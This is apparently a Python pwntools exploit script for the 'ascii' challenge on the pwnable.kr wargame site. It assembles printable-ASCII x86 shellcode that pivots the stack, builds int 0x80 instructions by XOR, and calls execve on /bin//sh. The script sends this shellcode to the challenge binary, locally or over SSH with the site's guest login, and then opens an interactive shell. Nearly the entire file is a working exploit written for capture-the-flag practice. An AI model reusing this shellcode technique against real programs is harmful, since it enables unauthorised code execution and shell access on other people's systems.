import os
from pwn import *
import argparse


context.log_level = 'info'
'''
pseudocode of logic:
    void* addr = mmap(0x80000000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
    if (addr == -1)
    {
        print something
        exit(1);
    }
    for (int i = 0; i < 400; i++)
    {
        addr[i] = getchar();
        if ((addr[i] > 0x1f) || (addr[i] < 0x7f))
            break
    }


'''

'''
what if i right away make the stack on the executable section.
then i put a ton of inc ecx, dec ecx in the end.
then i push a ton of int80 opcodes. It will be alighned.
'''

set_esp_to_end_of_our_page = '''
dec esp
dec esp
dec esp
dec esp
pop eax
xor al, 0x7e
inc eax
inc eax
xor al, 0x28
push eax
pop esp
'''

zerofy_eax = '''
push 0x30
pop eax
xor al, 0x30
'''

# assumes eax contains 0
put_int_80_into_eax = '''
dec eax
xor eax, 0x4f734f73
xor eax, 0x30413041
'''

# assumes eax contains 0
reverse_int_80 = '''
xor eax, 0x4f734f73
xor eax, 0x30413041
inc eax
'''

# assumes eax contains 0
setup_ebx = '''
push eax
push 0x68732f2f
push 0x6e69622f
push esp
pop ebx
'''

# assumes eax contains 0
setup_edx = '''
push eax
pop edx
'''
# assumes eax contains 0
setup_ecx = '''
push eax
push ebx
push esp
pop ecx
'''

# assumes eax contains 0
setup_eax = '''
xor al, 0x4a
xor al, 0x41
'''

# assumes eax contains 0xcd80cd80
push_int_80 = '''
push eax
'''

non_important_command = '''
inc edi
'''

host = 'pwnable.kr'
user = 'ascii'
port = 2222
password = 'guest'


BIN_PATH = './ascii'
REMOTE_BIN_PATH = '/home/ascii/ascii'
E = ELF(BIN_PATH)


def start_process(mode, connection=None):
    p = None

    if mode == 'local':
        log.info('running locally...')
        p = process(BIN_PATH)
    elif mode == 'remote':
        log.info('pwning...')
        p = connection.process(REMOTE_BIN_PATH)
    else:
        log.critical('invalid option')
        os.exit(1)
    return p


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('mode', choices=['local', 'remote'])
    args = parser.parse_args()
    connection = None
    if args.mode == 'remote':
        connection = ssh(host=host, port=port, user=user, password=password)

    while True:
        p = start_process(args.mode, connection)

        shellcode = set_esp_to_end_of_our_page + zerofy_eax + setup_ebx + setup_ecx + setup_edx + put_int_80_into_eax + push_int_80 * 10 + reverse_int_80 + setup_eax
        built_shellcode = asm(shellcode)
        final_shellcode = built_shellcode + (167 - len(built_shellcode)) * asm(non_important_command)
        print(len(final_shellcode))
        print(final_shellcode)
        p.sendline(final_shellcode)
        p.interactive()


if __name__ == '__main__':
    main()
